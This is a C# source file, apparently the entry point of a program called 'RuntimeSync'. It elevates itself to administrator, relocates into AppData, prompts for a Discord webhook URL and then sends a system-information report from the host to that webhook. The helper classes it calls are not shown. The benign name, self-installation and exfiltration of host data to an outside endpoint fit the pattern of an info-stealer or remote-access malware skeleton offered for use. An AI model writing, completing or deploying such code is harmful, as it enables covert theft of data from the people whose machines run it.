using System;

namespace RuntimeSync
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("[+] RuntimeSync started");

            // Load config
            var config = ConfigManager.LoadConfig();

            // First time? Install ourselves and bail.
            if (!Installer.IsInstalled())
            {
                Installer.RequestAdminRights();  // Will re-launch itself as admin if not already
                Installer.PerformInitialSetup(); // Will move to AppData & run from there
                return;
            }

            // If no webhook configured, ask the user
            if (string.IsNullOrWhiteSpace(config.WebhookUrl))
            {
                Console.Write("Enter your Discord Webhook URL: ");
                string input = Console.ReadLine();
                config.WebhookUrl = input.Trim();
                ConfigManager.SaveConfig(config);
                Console.WriteLine("[+] Webhook saved.");
            }

            // Send system info
            if (config.SendSystemInfo)
            {
                Console.WriteLine("[*] Sending system info to webhook...");
                string report = SystemInfo.GetSystemReport();
                Webhook.Send(config.WebhookUrl, report);
                Console.WriteLine("[+] Sent!");
            }

            Console.WriteLine("[*] Press any key to exit.");
            Console.ReadKey();
        }
    }
}